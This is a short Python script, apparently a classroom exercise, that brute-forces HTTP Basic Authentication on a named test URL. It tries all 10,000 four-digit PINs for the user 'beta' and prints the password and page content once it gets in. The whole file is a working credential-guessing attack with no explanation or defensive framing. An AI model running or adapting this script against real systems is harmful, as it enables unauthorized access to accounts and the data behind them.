import requests

if __name__ == '__main__':
    url = "http://nkust.ipv6.club.tw/Test"
    guess = ""
    try:
        for num in range(10000):
            guess = "{:04}".format(num)
            result = requests.get(url, auth=("beta", guess))
            if result.status_code == 200:
                print("Password: ", guess)
                print(result.text)
                break
        else:
            print("Fail")
    except:
        print("Fail: ", guess)
